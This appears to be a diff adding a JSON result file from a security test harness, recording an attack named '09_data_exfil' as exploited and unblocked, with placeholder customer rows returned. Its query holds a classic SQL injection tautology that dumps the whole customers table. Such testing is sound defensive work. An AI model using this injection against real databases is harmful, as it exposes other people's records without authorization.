@@ -1,0 +1,30 @@
+{
+  "attack": "09_data_exfil",
+  "exploited": true,
+  "detail": {
+    "blocked": false,
+    "result": {
+      "rows": [
+        [
+          "cust_aaaaaaaaaaaaaaaa",
+          "Acme Corp",
+          "enterprise",
+          "user-a"
+        ],
+        [
+          "cust_bbbbbbbbbbbbbbbb",
+          "Beta LLC",
+          "pro",
+          "user-b"
+        ],
+        [
+          "cust_cccccccccccccccc",
+          "Gamma Inc",
+          "free",
+          "user-a"
+        ]
+      ],
+      "query": "SELECT * FROM customers WHERE id = '' OR '1'='1'"
+    }
+  }
+}
